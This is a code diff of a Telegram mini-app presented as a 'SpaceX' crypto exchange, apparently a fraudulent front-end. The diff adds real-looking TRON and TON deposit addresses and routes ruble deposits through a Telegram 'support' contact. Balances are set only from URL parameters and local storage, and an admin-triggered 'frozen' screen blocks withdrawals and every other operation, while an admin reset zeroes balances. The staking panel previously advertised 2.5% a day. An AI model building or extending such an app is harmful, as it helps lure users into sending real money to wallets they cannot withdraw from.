@@ -338,7 +338,7 @@
         }
         .qr-wrap img { width: 168px; height: 168px; }
 
-        /* PIN Lock Screen */
+        /* PIN Lock & Freeze Screen */
         .pin-overlay {
             position: fixed; inset: 0; z-index: 200; background: var(--bg-base);
             display: none; flex-direction: column; align-items: center; justify-content: center; padding: 24px;
@@ -363,6 +363,15 @@
     </style>
 </head>
 <body>
+
+<!-- ЭКРАН БЛОКИРОВКИ ПРИ ЗАМОРОЗКЕ АККАУНТА (/frez) -->
+<div id="frozen-overlay" class="pin-overlay" style="z-index:250; text-align:center;">
+    <div style="font-size:54px; margin-bottom:14px;">⛔️</div>
+    <h2 style="font-size:20px; margin-bottom:10px;" data-i18n="frzTitle">Аккаунт заморожен</h2>
+    <p style="color:var(--text-muted); font-size:14px; max-width:320px; line-height:1.5;" data-i18n="frzDesc">
+        Ваш аккаунт заблокирован администратором. Любые операции с валютами, мем-коинами, пополнением и выводом недоступны.
+    </p>
+</div>
 
 <!-- ЭКРАН БЛОКИРОВКИ PIN-КОДОМ -->
 <div id="pin-overlay" class="pin-overlay">
@@ -526,7 +535,7 @@
         </div>
     </div>
 
-    <!-- ВКЛАДКА 2: КОШЕЛЁК + QR + СТЕЙКИНГ -->
+    <!-- ВКЛАДКА 2: КОШЕЛЁК + ПОПОЛНЕНИЕ (РУБЛИ/КРИПТА) + СТЕЙКИНГ 2% В МЕСЯЦ -->
     <div id="tab-wallet" class="tab-section">
         <div class="wallet-hero">
             <div style="display:flex; justify-content:space-between; align-items:center;">
@@ -541,21 +550,38 @@
             </div>
         </div>
 
-        <!-- Модальное окно QR-кода пополнения -->
-        <div class="glass-panel" id="qr-panel" style="display:none; text-align:center;">
-            <h3 style="font-size:15px;" data-i18n="lblQrTitle">📲 Пополнение по QR-коду</h3>
-            <label data-i18n="lblSelectNet">Сеть пополнения:</label>
-            <select id="qr-net" onchange="updateDepositQR()">
-                <option value="UQBSpaceXWalletTON98234792384792384">TON / GRAM (The Open Network)</option>
-                <option value="TSpaceXTronWalletTRC20998877665544">USDT (TRC-20)</option>
-                <option value="0xSpaceXEthereumERC20Wallet77889900">ETH / USDT (ERC-20)</option>
-                <option value="bc1qspacexbitcoinwalletaddress998877">Bitcoin (BTC Native SegWit)</option>
-            </select>
-            <div class="qr-wrap">
-                <img id="qr-img" src="" alt="QR">
+        <!-- Выбор способа пополнения: Криптовалюта или Рубли -->
+        <div class="glass-panel" id="qr-panel" style="display:none;">
+            <h3 style="font-size:15px; margin-bottom:10px; text-align:center;" data-i18n="lblDepChoose">Выберите способ пополнения</h3>
+            <div class="mode-switch">
+                <button class="mode-btn active" id="dep-tab-crypto" onclick="switchDepositMethod('crypto')" data-i18n="depMethodCrypto">💎 Криптовалюта</button>
+                <button class="mode-btn" id="dep-tab-rub" onclick="switchDepositMethod('rub')" data-i18n="depMethodRub">💵 Рубли</button>
             </div>
-            <div id="qr-addr-text" style="font-size:11px; font-family:monospace; word-break:break-all; padding:8px; background:var(--input-bg); border-radius:10px;"></div>
-            <button class="btn-main" onclick="copyDepositAddr()" data-i18n="btnCopyAddr">📋 Скопировать адрес</button>
+
+            <!-- Подвкладка: Криптовалюта (только ваши TRON и TON адреса) -->
+            <div id="dep-crypto-box" style="text-align:center;">
+                <label data-i18n="lblSelectNet">Сеть пополнения:</label>
+                <select id="qr-net" onchange="updateDepositQR()">
+                    <option value="TCPm4tcp4FAiHayAeTx6Nfw4JeX1B7M1r4">TRON (TRC-20)</option>
+                    <option value="UQALAPr4jl74g5pkCCB1TJ0zUmridw3Zice8F0bdY2GeNzfs">TON (Toncoin / GRAM)</option>
+                </select>
+                <div class="qr-wrap">
+                    <img id="qr-img" src="" alt="QR">
+                </div>
+                <div id="qr-addr-text" style="font-size:11px; font-family:monospace; word-break:break-all; padding:9px; background:var(--input-bg); border-radius:10px; border:1px solid var(--border);"></div>
+                <button class="btn-main" onclick="copyDepositAddr()" data-i18n="btnCopyAddr">📋 Скопировать адрес</button>
+            </div>
+
+            <!-- Подвкладка: Рубли (только через поддержку) -->
+            <div id="dep-rub-box" style="display:none; text-align:center; padding:14px 6px;">
+                <div style="font-size:38px; margin-bottom:8px;">💵</div>
+                <p style="font-size:13px; color:var(--text-main); line-height:1.5; margin-bottom:14px;" data-i18n="depRubText">
+                    Пополнение рублями временно доступно только через поддержку.
+                </p>
+                <button class="btn-main" onclick="tg.openTelegramLink('https://t.me/ssupppoortt')" data-i18n="btnContactSup">
+                    💬 Обратиться в поддержку
+                </button>
+            </div>
         </div>
 
         <!-- Форма вывода в Кошельке -->
@@ -564,21 +590,21 @@
             <label data-i18n="lblChkCoin">Выберите валюту:</label>
             <select id="wd-coin"></select>
             <label data-i18n="lblWdAddr">Адрес кошелька / Карта:</label>
-            <input type="text" id="wd-address" placeholder="UQ... / 0x... / Card">
+            <input type="text" id="wd-address" placeholder="UQ... / T... / Card">
             <label data-i18n="lblChkAmt">Введите сумму:</label>
             <input type="number" id="wd-amount" placeholder="0.00">
             <button class="btn-main" onclick="executeWithdrawWeb()" data-i18n="btnConfirmWd">Подтвердить вывод</button>
         </div>
 
-        <!-- Стейкинг (Earn +2.5% в сутки) -->
+        <!-- Стейкинг (2% в месяц) -->
         <div class="glass-panel" id="staking-panel" style="display:none;">
             <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
-                <h3 style="font-size:15px;" data-i18n="lblStakingTitle">💎 Стейкинг (Earn +2.5% / день)</h3>
-                <span style="font-size:11px; color:var(--up); font-weight:800;">APY 912%</span>
+                <h3 style="font-size:15px;" data-i18n="lblStakingTitle">💎 Стейкинг (2% в месяц)</h3>
+                <span style="font-size:11px; color:var(--up); font-weight:800;">+2% / мес</span>
             </div>
             <div style="display:grid; grid-template-columns:1.2fr 1fr; gap:8px;">
                 <select id="stk-coin"></select>
-                <input type="number" id="stk-amount" placeholder="Сумма">
+                <input type="number" id="stk-amount" placeholder="0.00">
             </div>
             <button class="btn-main" onclick="stakeCoins()" data-i18n="btnStakeNow">🔒 Инвестировать в стейкинг</button>
             <div id="staking-active-list" style="margin-top:12px; font-size:12px;"></div>
@@ -672,7 +698,7 @@
         </div>
     </div>
 
-    <!-- ВКЛАДКА 6: НАСТРОЙКИ (ЯЗЫКИ + PIN-КОД + 14 ТЕМ) -->
+    <!-- ВКЛАДКА 6: НАСТРОЙКИ -->
     <div id="tab-settings" class="tab-section">
         <div class="glass-panel">
             <h3 style="font-size:15px;" data-i18n="lblSetLang">🌍 Язык интерфейса</h3>
@@ -752,7 +778,6 @@
     tg.ready();
     tg.expand();
 
-    // Тактильная отдача (Haptic Feedback)
     function haptic(type = "light") {
         try {
             if (!tg.HapticFeedback) return;
@@ -771,6 +796,8 @@
 
     const I18N = {
         ru: {
+            frzTitle: "Аккаунт заморожен",
+            frzDesc: "Ваш аккаунт заблокирован администратором. Любые операции с валютами, мем-коинами, пополнением и выводом недоступны.",
             modeFutures: "💎 Фьючерсы", modeMemes: "🚀 Мем-коины",
             lblMargin: "Маржа (USDT):", lblLeverage: "Плечо:",
             lblOpenPositions: "Открытые позиции:", noPositions: "Нет открытых сделок.",
@@ -778,8 +805,10 @@
             lblMyMemes: "Мои мем-активы:", noMemes: "У вас пока нет купленных мем-коинов.",
             lblTotalBalance: "Общий баланс портфеля",
             btnDeposit: "➕ Пополнить", btnWithdraw: "📤 Вывести", btnStaking: "💎 Стейкинг",
-            lblQrTitle: "📲 Пополнение по QR-коду", lblSelectNet: "Сеть пополнения:", btnCopyAddr: "📋 Скопировать адрес",
-            lblStakingTitle: "💎 Стейкинг (Earn +2.5% / день)", btnStakeNow: "🔒 Инвестировать в стейкинг",
+            lblDepChoose: "Выберите способ пополнения", depMethodCrypto: "💎 Криптовалюта", depMethodRub: "💵 Рубли",
+            depRubText: "Пополнение рублями временно доступно только через поддержку.", btnContactSup: "💬 Обратиться в поддержку",
+            lblSelectNet: "Сеть пополнения:", btnCopyAddr: "📋 Скопировать адрес",
+            lblStakingTitle: "💎 Стейкинг (2% в месяц)", btnStakeNow: "🔒 Инвестировать в стейкинг",
             lblWdTitle: "📤 Вывод средств", lblWdAddr: "Адрес кошелька / Карта:", btnConfirmWd: "Подтвердить вывод",
             lblExTitle: "Мгновенный обмен валют", lblExFrom: "Отдаете:", lblExTo: "Получаете:", btnExchangeNow: "🔄 Обменять",
             lblChkTitle: "Создание мульти-чека", lblChkCoin: "Выберите валюту:", lblChkAmt: "Общая сумма:",
@@ -797,6 +826,8 @@
             searchPlaceholder: "🔍 Поиск мем-коина..."
         },
         uk: {
+            frzTitle: "Акаунт заморожено",
+            frzDesc: "Ваш акаунт заблоковано адміністратором. Будь-які операції з валютами, мем-коїнами, поповненням та виведенням недоступні.",
             modeFutures: "💎 Ф'ючерси", modeMemes: "🚀 Мем-коїни",
             lblMargin: "Маржа (USDT):", lblLeverage: "Плече:",
             lblOpenPositions: "Відкриті позиції:", noPositions: "Немає відкритих угод.",
@@ -804,8 +835,10 @@
             lblMyMemes: "Мої мем-активи:", noMemes: "У вас поки немає куплених мем-коїнів.",
             lblTotalBalance: "Загальний баланс портфеля",
             btnDeposit: "➕ Поповнити", btnWithdraw: "📤 Вивести", btnStaking: "💎 Стейкінг",
-            lblQrTitle: "📲 Поповнення за QR-кодом", lblSelectNet: "Мережа поповнення:", btnCopyAddr: "📋 Скопіювати адресу",
-            lblStakingTitle: "💎 Стейкінг (Earn +2.5% / день)", btnStakeNow: "🔒 Інвестувати у стейкінг",
+            lblDepChoose: "Оберіть спосіб поповнення", depMethodCrypto: "💎 Криптовалюта", depMethodRub: "💵 Рублі",
+            depRubText: "Поповнення рублями тимчасово доступне лише через підтримку.", btnContactSup: "💬 Звернутися в підтримку",
+            lblSelectNet: "Мережа поповнення:", btnCopyAddr: "📋 Скопіювати адресу",
+            lblStakingTitle: "💎 Стейкінг (2% на місяць)", btnStakeNow: "🔒 Інвестувати у стейкінг",
             lblWdTitle: "📤 Виведення коштів", lblWdAddr: "Адреса гаманця / Картка:", btnConfirmWd: "Підтвердити виведення",
             lblExTitle: "Миттєвий обмін валют", lblExFrom: "Віддаєте:", lblExTo: "Отримуєте:", btnExchangeNow: "🔄 Обміняти",
             lblChkTitle: "Створення мульти-чека", lblChkCoin: "Оберіть валюту:", lblChkAmt: "Загальна сума:",
@@ -823,6 +856,8 @@
             searchPlaceholder: "🔍 Пошук мем-коїна..."
         },
         en: {
+            frzTitle: "Account Frozen",
+            frzDesc: "Your account has been frozen by an administrator. All currency operations, meme coins, deposits, and withdrawals are disabled.",
             modeFutures: "💎 Futures", modeMemes: "🚀 Meme Coins",
             lblMargin: "Margin (USDT):", lblLeverage: "Leverage:",
             lblOpenPositions: "Open Positions:", noPositions: "No active positions.",
@@ -830,8 +865,10 @@
             lblMyMemes: "My Meme Assets:", noMemes: "No meme coins bought yet.",
             lblTotalBalance: "Total Portfolio Balance",
             btnDeposit: "➕ Deposit", btnWithdraw: "📤 Withdraw", btnStaking: "💎 Staking",
-            lblQrTitle: "📲 QR Code Deposit", lblSelectNet: "Deposit Network:", btnCopyAddr: "📋 Copy Address",
-            lblStakingTitle: "💎 Staking (Earn +2.5% / day)", btnStakeNow: "🔒 Stake Coins Now",
+            lblDepChoose: "Select Deposit Method", depMethodCrypto: "💎 Cryptocurrency", depMethodRub: "💵 Rubles",
+            depRubText: "Ruble deposits are temporarily available only through support.", btnContactSup: "💬 Contact Support",
+            lblSelectNet: "Deposit Network:", btnCopyAddr: "📋 Copy Address",
+            lblStakingTitle: "💎 Staking (2% per month)", btnStakeNow: "🔒 Stake Coins Now",
             lblWdTitle: "📤 Withdraw Funds", lblWdAddr: "Wallet Address / Card:", btnConfirmWd: "Confirm Withdraw",
             lblExTitle: "Instant Currency Swap", lblExFrom: "You send:", lblExTo: "You receive:", btnExchangeNow: "🔄 Swap Now",
             lblChkTitle: "Create Multi-Check", lblChkCoin: "Select currency:", lblChkAmt: "Total amount:",
@@ -849,6 +886,8 @@
             searchPlaceholder: "🔍 Search meme coin..."
         },
         zh: {
+            frzTitle: "账户已冻结",
+            frzDesc: "您的账户已被管理员冻结。所有货币操作、迷因币交易、充值和提现均不可用。",
             modeFutures: "💎 合约交易", modeMemes: "🚀 迷因币",
             lblMargin: "保证金 (USDT)：", lblLeverage: "杠杆倍数：",
             lblOpenPositions: "当前持仓：", noPositions: "暂无持仓。",
@@ -856,8 +895,10 @@
             lblMyMemes: "我的迷因资产：", noMemes: "暂未购买迷因币。",
             lblTotalBalance: "总资产估值",
             btnDeposit: "➕ 充值", btnWithdraw: "📤 提现", btnStaking: "💎 质押赚币",
-            lblQrTitle: "📲 二维码充值", lblSelectNet: "充值网络：", btnCopyAddr: "📋 复制地址",
-            lblStakingTitle: "💎 质押生息 (每日 +2.5%)", btnStakeNow: "🔒 立即质押",
+            lblDepChoose: "选择充值方式", depMethodCrypto: "💎 加密货币", depMethodRub: "💵 卢布",
+            depRubText: "卢布充值暂时仅通过客服支持提供。", btnContactSup: "💬 联系客服",
+            lblSelectNet: "充值网络：", btnCopyAddr: "📋 复制地址",
+            lblStakingTitle: "💎 质押生息 (每月 +2%)", btnStakeNow: "🔒 立即质押",
             lblWdTitle: "📤 提现资产", lblWdAddr: "钱包地址 / 银行卡：", btnConfirmWd: "确认提现",
             lblExTitle: "闪电兑换", lblExFrom: "支付币种：", lblExTo: "获得币种：", btnExchangeNow: "🔄 立即兑换",
             lblChkTitle: "创建多份支票", lblChkCoin: "选择币种：", lblChkAmt: "总金额：",
@@ -995,15 +1036,18 @@
     const params = new URLSearchParams(window.location.search);
     const tgUserId = (tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.id) || params.get("uid") || "default";
     const botUsername = params.get("bot") || "spacexcrypto_bot";
-    const STORAGE_KEY = `spacex_state_v5_${tgUserId}`;
+    const urlSyncVer = parseInt(params.get("v") || "0", 10);
+    const urlResetVer = parseInt(params.get("rv") || "0", 10);
+    const isAccountFrozen = params.get("frozen") === "1";
+    const STORAGE_KEY = `spacex_state_v6_${tgUserId}`;
 
     const BALANCES = {};
     Object.keys(COINS).forEach(k => BALANCES[k] = 0);
 
     let memeHoldings = {};
     let positions = [];
-    let stakes = [];      // [{id, coin, amount, startTime}]
-    let webChecks = {};   // {code: {coin, total, perClaim, maxActs, claimedCount, password}}
+    let stakes = [];
+    let webChecks = {};
     let hideBalance = false;
     let userPin = null;
     let currentLang = params.get("lang") || "ru";
@@ -1011,17 +1055,42 @@
     let currentInterval = "1";
     let klineCandles = [];
 
+    function checkNotFrozen() {
+        if (isAccountFrozen) {
+            haptic("error");
+            const d = I18N[currentLang] || I18N.ru;
+            showToast("⛔️ " + d.frzTitle);
+            return false;
+        }
+        return true;
+    }
+
+    // ================= НАДЕЖНАЯ СИНХРОНИЗАЦИЯ БОТ ↔ ПРИЛОЖЕНИЕ =================
     function loadAppState() {
         let saved = null;
         try { saved = JSON.parse(localStorage.getItem(STORAGE_KEY) || "null"); } catch (e) { saved = null; }
 
         const urlBalances = {};
-        Object.keys(COINS).forEach(t => { urlBalances[t] = parseFloat(params.get(t)) || 0; });
-        if (params.has("TON") && !urlBalances.GRAM) urlBalances.GRAM = parseFloat(params.get("TON")) || 0;
+        let hasUrlBalances = false;
+        Object.keys(COINS).forEach(t => {
+            if (params.has(t)) hasUrlBalances = true;
+            urlBalances[t] = parseFloat(params.get(t)) || 0;
+        });
+
+        // Если админ ввел /0 ID (увеличился urlResetVer) -> обнуляем всё!
+        if (saved && urlResetVer > (saved.lastResetVer || 0)) {
+            Object.keys(COINS).forEach(t => { BALANCES[t] = 0; });
+            memeHoldings = {};
+            positions = [];
+            stakes = [];
+            webChecks = {};
+            saveAppState(urlBalances, urlSyncVer, urlResetVer);
+            return;
+        }
 
         if (!saved) {
             Object.keys(COINS).forEach(t => { BALANCES[t] = urlBalances[t]; });
-            saveAppState(urlBalances);
+            saveAppState(urlBalances, urlSyncVer, urlResetVer);
         } else {
             Object.keys(COINS).forEach(t => {
                 BALANCES[t] = typeof saved.balances?.[t] === "number" ? saved.balances[t] : 0;
@@ -1035,21 +1104,26 @@
             if (saved.lang && I18N[saved.lang]) currentLang = saved.lang;
             if (saved.theme && ALL_THEMES.includes(saved.theme)) currentTheme = saved.theme;
 
+            // Если в боте изменились балансы (новая версия v или изменились значения в URL)
             const lastUrlSnap = saved.lastUrlSnap || {};
-            let changedFromBot = false;
-            Object.keys(COINS).forEach(t => {
-                const prevUrlVal = typeof lastUrlSnap[t] === "number" ? lastUrlSnap[t] : 0;
-                const diff = urlBalances[t] - prevUrlVal;
-                if (Math.abs(diff) > 1e-9) {
-                    BALANCES[t] = Math.max(0, (BALANCES[t] || 0) + diff);
-                    changedFromBot = true;
-                }
-            });
-            if (changedFromBot) saveAppState(urlBalances);
+            const prevSyncVer = saved.lastSyncVer || 0;
+
+            if (hasUrlBalances && urlSyncVer > prevSyncVer) {
+                Object.keys(COINS).forEach(t => {
+                    const prevUrlVal = typeof lastUrlSnap[t] === "number" ? lastUrlSnap[t] : 0;
+                    const diff = urlBalances[t] - prevUrlVal;
+                    if (urlBalances[t] === 0 && prevUrlVal > 0) {
+                        BALANCES[t] = 0;
+                    } else if (Math.abs(diff) > 1e-9) {
+                        BALANCES[t] = Math.max(0, (BALANCES[t] || 0) + diff);
+                    }
+                });
+                saveAppState(urlBalances, urlSyncVer, urlResetVer);
+            }
         }
     }
 
-    function saveAppState(newUrlSnap = null) {
+    function saveAppState(newUrlSnap = null, newSyncVer = null, newResetVer = null) {
         try {
             let prev = {};
             try { prev = JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}"); } catch (e) {}
@@ -1062,9 +1136,15 @@
             const stateObj = {
                 balances: BALANCES, memeHoldings, positions, stakes, webChecks,
                 hideBalance, userPin, lang: currentLang, theme: currentTheme,
-                lastUrlSnap: urlSnap, updatedAt: Date.now()
+                lastUrlSnap: urlSnap,
+                lastSyncVer: newSyncVer !== null ? newSyncVer : (prev.lastSyncVer ?? urlSyncVer),
+                lastResetVer: newResetVer !== null ? newResetVer : (prev.lastResetVer ?? urlResetVer),
+                updatedAt: Date.now()
             };
             localStorage.setItem(STORAGE_KEY, JSON.stringify(stateObj));
+            if (tg.CloudStorage && typeof tg.CloudStorage.setItem === "function") {
+                tg.CloudStorage.setItem("spacex_balances_" + tgUserId, JSON.stringify(BALANCES));
+            }
         } catch (e) {}
     }
 
@@ -1075,7 +1155,7 @@
         setTimeout(() => { t.style.display = "none"; }, 2600);
     }
 
-    // ================= СКРЫТИЕ БАЛАНСА И QR-КОД =================
+    // ================= СКРЫТИЕ БАЛАНСА И ПОПОЛНЕНИЕ (КРИПТА / РУБЛИ) =================
     function toggleHideBalance() {
         haptic("light");
         hideBalance = !hideBalance;
@@ -1086,6 +1166,7 @@
     }
 
     function toggleWalletBox(panelId) {
+        if (!checkNotFrozen()) return;
         haptic("light");
         ["qr-panel", "withdraw-panel", "staking-panel"].forEach(id => {
             const el = document.getElementById(id);
@@ -1099,6 +1180,15 @@
         if (panelId === "staking-panel") renderStakes();
     }
 
+    function switchDepositMethod(method) {
+        haptic("light");
+        document.getElementById("dep-tab-crypto").classList.toggle("active", method === "crypto");
+        document.getElementById("dep-tab-rub").classList.toggle("active", method === "rub");
+        document.getElementById("dep-crypto-box").style.display = method === "crypto" ? "block" : "none";
+        document.getElementById("dep-rub-box").style.display = method === "rub" ? "block" : "none";
+        if (method === "crypto") updateDepositQR();
+    }
+
     function updateDepositQR() {
         const addr = document.getElementById("qr-net").value;
         document.getElementById("qr-img").src =
@@ -1107,19 +1197,21 @@
     }
 
     function copyDepositAddr() {
+        if (!checkNotFrozen()) return;
         haptic("success");
         const addr = document.getElementById("qr-net").value;
         navigator.clipboard?.writeText(addr);
-        showToast("✅ Адрес скопирован в буфер обмена!");
+        showToast("✅ Адрес скопирован: " + addr.slice(0, 10) + "...");
     }
 
-    // ================= СТЕЙКИНГ (EARN +2.5% В СУТКИ) =================
+    // ================= СТЕЙКИНГ (2% В МЕСЯЦ) =================
     function getStakeReward(s) {
-        const days = Math.max(0, (Date.now() - s.startTime) / 86400000);
-        return s.amount * 0.025 * days;
+        const monthsElapsed = Math.max(0, (Date.now() - s.startTime) / (30 * 86400000));
+        return s.amount * 0.02 * monthsElapsed;
     }
 
     function stakeCoins() {
+        if (!checkNotFrozen()) return;
         const coin = document.getElementById("stk-coin").value;
         const amt = parseFloat(document.getElementById("stk-amount").value) || 0;
         const d = I18N[currentLang] || I18N.ru;
@@ -1135,10 +1227,11 @@
         saveAppState();
         renderStakes();
         renderWallet();
-        showToast(`💎 В стейкинг: ${formatUnlimitedNumber(amt)} ${coin}`);
+        showToast(`💎 В стейкинг (2%/мес): ${formatUnlimitedNumber(amt)} ${coin}`);
     }
 
     function unstakeCoins(id) {
+        if (!checkNotFrozen()) return;
         const idx = stakes.findIndex(s => s.id === id);
         if (idx === -1) return;
         haptic("success");
@@ -1150,7 +1243,7 @@
         saveAppState();
         renderStakes();
         renderWallet();
-        showToast(`✅ Выведено из стейкинга: +${formatUnlimitedNumber(total, 6)} ${s.coin}`);
+        showToast(`✅ Выведено: +${formatUnlimitedNumber(total, 6)} ${s.coin}`);
     }
 
     function renderStakes() {
@@ -1169,7 +1262,7 @@
                 <div style="display:flex; justify-content:space-between; align-items:center;">
                     <div>
                         <strong>${formatUnlimitedNumber(s.amount, 4)} ${s.coin}</strong>
-                        <div style="font-size:11px; color:var(--up);">Начислено: +${r.toFixed(6)} ${s.coin}</div>
+                        <div style="font-size:11px; color:var(--up);">Начислено (2%/мес): +${r.toFixed(6)} ${s.coin}</div>
                     </div>
                     <button class="small-action-btn" style="background:var(--up); color:#000;" onclick="unstakeCoins(${s.id})">Забрать</button>
                 </div>
@@ -1179,7 +1272,7 @@
     }
 
     // ================= ЗАЩИТА PIN-КОДОМ =================
-    let pinMode = "unlock"; // "unlock" | "setup"
+    let pinMode = "unlock";
     let pinBuffer = "";
 
     function updatePinSettingsUI() {
@@ -1197,6 +1290,7 @@
     }
 
     function openPinSetup() {
+        if (!checkNotFrozen()) return;
         haptic("light");
         pinMode = "setup";
         pinBuffer = "";
@@ -1274,6 +1368,7 @@
     }
 
     function executeWithdrawWeb() {
+        if (!checkNotFrozen()) return;
         const coin = document.getElementById("wd-coin").value;
         const addr = document.getElementById("wd-address").value.trim();
         const amt = parseFloat(document.getElementById("wd-amount").value) || 0;
@@ -1469,6 +1564,7 @@
     }
 
     function buyMemeCoin() {
+        if (!checkNotFrozen()) return;
         const ticker = document.getElementById("meme-select").value;
         const amt = parseFloat(document.getElementById("meme-buy-amount").value) || 0;
         const d = I18N[currentLang] || I18N.ru;
@@ -1507,6 +1603,7 @@
     }
 
     function sellMemeByTicker(ticker) {
+        if (!checkNotFrozen()) return;
         const hold = memeHoldings[ticker];
         if (!hold || hold.tokens <= 0) return;
         haptic("success");
@@ -1527,6 +1624,7 @@
     }
 
     function sellSelectedMeme() {
+        if (!checkNotFrozen()) return;
         const ticker = document.getElementById("meme-select").value;
         if (!memeHoldings[ticker]) return;
         sellMemeByTicker(ticker);
@@ -1698,11 +1796,13 @@
     }
 
     function setPct(inputId, pct) {
+        if (!checkNotFrozen()) return;
         haptic("light");
         document.getElementById(inputId).value = ((BALANCES.USDT || 0) * pct).toFixed(2);
     }
 
     function openPosition(side) {
+        if (!checkNotFrozen()) return;
         const pair = activeFuturesPair;
         const amt = parseFloat(document.getElementById("trade-amount").value) || 0;
         const lev = parseFloat(document.getElementById("trade-lev").value) || 10;
@@ -1726,6 +1826,7 @@
     }
 
     function closePosition(id) {
+        if (!checkNotFrozen()) return;
         const idx = positions.findIndex(p => p.id === id);
         if (idx === -1) return;
         haptic("success");
@@ -1858,6 +1959,7 @@
     }
 
     function executeExchange() {
+        if (!checkNotFrozen()) return;
         const from = document.getElementById("ex-from").value;
         const to = document.getElementById("ex-to").value;
         const amt = parseFloat(document.getElementById("ex-amount").value) || 0;
@@ -1881,6 +1983,7 @@
 
     // ================= МУЛЬТИ-ЧЕКИ И ЧЕКИ С ПАРОЛЕМ =================
     function createCheckWeb() {
+        if (!checkNotFrozen()) return;
         const coin = document.getElementById("chk-coin").value;
         const amt = parseFloat(document.getElementById("chk-amount").value) || 0;
         const acts = Math.max(1, parseInt(document.getElementById("chk-acts").value) || 1);
@@ -1923,6 +2026,7 @@
     }
 
     function shareCheckInline(code) {
+        if (!checkNotFrozen()) return;
         haptic("light");
         if (tg.switchInlineQuery) {
             tg.switchInlineQuery(`#${code}`, ["users", "groups", "channels"]);
@@ -1933,6 +2037,7 @@
     }
 
     function claimCheckWeb() {
+        if (!checkNotFrozen()) return;
         const rawCode = document.getElementById("claim-code-input").value.trim().replace(/^#/, "").toUpperCase();
         const enteredPwd = document.getElementById("claim-pwd-input").value.trim();
         const chk = webChecks[rawCode];
@@ -2058,8 +2163,10 @@
     renderMemeHoldings();
     renderMyChecks();
 
-    // Если установлен PIN-код — запрашиваем его при входе
-    if (userPin) {
+    // Если аккаунт заморожен по /frez — блокируем весь экран приложения
+    if (isAccountFrozen) {
+        document.getElementById("frozen-overlay").style.display = "flex";
+    } else if (userPin) {
         pinMode = "unlock";
         pinBuffer = "";
         document.getElementById("pin-title").textContent = "Введите PIN-код";
